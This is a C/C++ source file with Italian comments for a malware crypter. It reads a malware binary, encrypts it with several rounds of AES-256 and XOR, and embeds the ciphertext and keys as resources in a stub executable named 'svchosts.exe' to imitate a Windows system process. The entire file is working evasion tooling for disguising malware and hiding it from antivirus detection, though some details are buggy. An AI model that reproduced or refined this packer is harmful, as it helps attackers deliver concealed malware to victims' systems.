#include <stdio.h>
#include <time.h>
#include "encrypt.h"

using namespace std; // namespace std e' un insieme di funzioni e classi che ci permettono di scrivere codice piu' velocemente


//array che conterranno i raw byte del malware e dello stub
unsigned char* malware;
unsigned char* stub;




int main(int argc, char* argv[]){
    char * malwarePath = argv[1];

    FILE* pMalware;
    FILE* pStub;
    long malwareLen;
    long stubLen;

    unsigned char AESkey[32];
    unsigned char XORkey[32];
    int tmp = 1 + rand() % 37;

    int* ROTkey = &tmp;
    srand((unsigned int)time(NULL));

    //genero casualmente la chiave AES di 32 byte
    for(int i = 0; i< 32; i++){
        AESkey[i] = (unsigned char) (rand() % 256);
        printf("chiave: %x\n", AESkey[i]);
    }
    for(int i = 0; i< 32; i++){
        XORkey[i] = (unsigned char) (rand() % 256);
        printf("chiave: %x\n", XORkey[i]);
    }


    //////////////////////////////
    //Questa routine permette di aprire un file come sequenza di byte, prenderne
    //prendo il path del malware da lina di comando e lo apro in modalita' read-byte 
    pMalware = fopen(malwarePath, "rb");  // Open the file in binary mode
    fseek(pMalware, 0, SEEK_END);          // Jump to the end of the file
    malwareLen = ftell(pMalware);          // Get the current byte offset in the file
    rewind(pMalware);                      // Jump back to the beginning of the file
    malware = new unsigned char[malwareLen];
    fread(malware, malwareLen, 1, pMalware);   // Read in the entire file
    fclose(pMalware);
    //////////////////////////////
    //prendo il path dello stub  lo apro in modalita' read-byte 

    pStub = fopen("mio_stub.exe", "rb");  // Open the file in binary mode
    fseek(pStub, 0, SEEK_END);          // Jump to the end of the file
    stubLen = ftell(pStub);          // Get the current byte offset in the file
    rewind(pStub);                      // Jump back to the beginning of the file
    stub = new unsigned char[stubLen];

    fread(stub, stubLen, 1, pStub);   // Read in the entire file
    fclose(pStub);

    //////////////////////////////
    //copio i raw bytes dei file malwere e stub in due array di unsigned char
    for(int i = 0; i < 2000; i++){
        printf("%c",malware[i]);
    }
    printf("\n\n\n\n");

    int nAES = 1 + rand() % 20;
    int nXOR = 1 + rand() % 20;
    for(int i = 0; i< nAES; i++){
        AESEncrypt(malware, malwareLen, (char *)AESkey, sizeof(AESkey)); //cripto in AES-256 il malware
    }
    for(int i = 0; i< nXOR; i++){
        XOR(malware, malwareLen, (char *)XORkey, sizeof(XORkey)); //cripto in AES-256 il malware
    }
    //ROT_encrypt(malware, malwareLen, *ROTkey);



    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato

    HANDLE hUpdateRes;
    BOOL result;
    BOOL resultAESKey;
    BOOL resultXORKey;
    BOOL resultROTKey;
	
    BOOL nAESresult;
    BOOL nXORresult;    

    hUpdateRes = BeginUpdateResource("svchosts.exe", FALSE);
    if (hUpdateRes == NULL)
    {
        printf("impossibile aprire lo stub per scrivere le risorse");
        return 0;
    }
    //ringraziamo il cielo che in AES-256 la lunghezza dei byte originali e dei criptati e' la stessa
    //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
    //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(69), NULL, malware, malwareLen);
    //mi passo la mia chiave generata casualmente tramite la sezione resources
    resultAESKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(420), NULL, AESkey, sizeof(AESkey));
    resultXORKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(421), NULL, XORkey, sizeof(XORkey));
    resultROTKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(422), NULL, ROTkey, sizeof(ROTkey));

    nAESresult = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(123), NULL, &nAES, sizeof(nAES));
    nXORresult = UpdateResource(hUpdateRes,"BIN", MAKEINTRESOURCE(124), NULL, &nXOR, sizeof(nXOR));


    if(result == FALSE){
        printf("impossibile aggiungere il malware allo stub");
        return 0;
    }
    if(resultAESKey == FALSE){
        printf("impossibile aggiungere la chiave AES allo stub");
        return 0;
    }
    if(resultXORKey == FALSE){
        printf("impossibile aggiungere la chiave XOR allo stub");
        return 0;
    }    
    if(resultROTKey == FALSE){
        printf("impossibile aggiungere la chiave ROT allo stub");
        return 0;
    }

    if (!EndUpdateResource(hUpdateRes, FALSE)){
        printf("impossibile salvare le modifiche");
        return 0;
    }

    printf("\n\n\nSUCCESSO\n\n\n");
    return 0;
}
